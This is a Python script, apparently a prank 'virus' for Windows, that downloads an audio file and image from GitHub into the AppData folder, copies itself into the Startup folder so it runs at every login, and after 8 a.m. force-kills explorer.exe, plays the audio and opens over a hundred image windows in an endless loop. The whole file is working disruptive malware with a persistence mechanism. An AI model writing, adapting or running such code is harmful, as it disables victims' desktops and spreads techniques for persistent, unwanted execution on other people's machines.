# Andrew Maney 2022

# IMPORTS
import os
import sys
from os import path
import threading
import playsound
import requests
import shutil
import time
from datetime import datetime
from tkinter import *



# VARS
AppDataPath = os.getenv('APPDATA') + ""
StartupPath = AppDataPath + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
now = datetime.now()



# FUNCTIONS

def DownloadFiles():
    if("\\Microsoft\\Windows\\Start Menu\\Programs\\Startup" in os.getcwd()):
        0+0
    else:
        r = requests.get("https://github.com/MEMESCOEP/Virus2/blob/main/Hey%20Ya!%20Low%20quality.mp3?raw=true")
        with open('.\\lmao.mp3', 'wb') as f:
            f.write(r.content)

        r = requests.get("https://github.com/MEMESCOEP/Virus2/raw/main/lmao.png")
        with open('.\\lmao.png', 'wb') as f:
            f.write(r.content)
        
        if(path.exists(AppDataPath + ".\\lmao.mp3")):
            os.remove(AppDataPath + ".\\lmao.mp3")

        if(path.exists(AppDataPath + ".\\lmao.png")):
            os.remove(AppDataPath + ".\\lmao.png")

        shutil.move('.\\lmao.mp3', AppDataPath)
        shutil.move('.\\lmao.png', AppDataPath)


def PlaySound():
        playsound.playsound(AppDataPath + "\\lmao.mp3")


def CopyFiles():
    
    if("\\Microsoft\\Windows\\Start Menu\\Programs\\Startup" in os.getcwd()):
        0+0
    else:
        shutil.copy(sys.argv[0], StartupPath)



def System():
    th = threading.Thread(target=PlaySound)
    while True:
        if(now.hour >= 8):  
            if th != None:          
                th.start()
                th = None
            

            os.system("taskkill /IM explorer.exe /F")

            window = Tk()
            window.title('LMAO')
            
            #window.resizable(False, False)            
            canvas = Canvas(window, width = 1000, height = 300)
            canvas.pack()
            my_image = PhotoImage(file=(AppDataPath + "\\lmao.png"))
            #my_image.width = 10000
            canvas.create_image(0, 0, anchor = NW, image=my_image)
            for x in range(100):
                nw = Toplevel(window)
                canvas = Canvas(nw, width = 1000, height = 300)
                canvas.pack()
                canvas.create_image(0, 0, anchor = NW, image=my_image)
                nw.update()
            window.mainloop()
        else:
            time.sleep(1)


DownloadFiles()
CopyFiles()
System()
